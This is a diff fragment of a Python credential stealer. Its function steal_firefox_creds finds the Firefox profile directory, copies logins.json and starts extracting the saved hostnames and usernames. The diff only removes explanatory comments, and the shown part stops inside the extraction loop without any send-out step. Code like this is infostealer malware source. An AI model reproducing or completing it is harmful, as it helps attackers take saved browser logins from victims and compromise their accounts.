@@ -27,7 +27,7 @@ def my_firefox_datetime(time_in_microseconds):
            datetime(1601, 1, 1, tzinfo=timezone.utc)
 
 def steal_firefox_creds():
-    # get the path to the Firefox password database file
+
     password_db_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles", "*", "logins.json")
     profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
     for foldername in os.listdir(profile_path):
@@ -36,17 +36,17 @@ def steal_firefox_creds():
             password_db_path = os.path.join(folder_path, "logins.json")
             break
 
-    # copy the password database file to a temporary location to avoid access denied errors
+
     shutil.copyfile(password_db_path, "my_firefox_data.json")
 
-    # open the database file and extract the credentials
+
     with open("my_firefox_data.json", "r", encoding="utf-8") as f:
         data = json.load(f)
 
     creds = {}
     for entry in data["logins"]:
         if "http" not in entry["hostname"] and "https" not in entry["hostname"]:
-            continue  # skip non-http(s) entries
+            continue  
 
         url = entry["hostname"] + entry["httpRealm"]
         username = entry["username"]
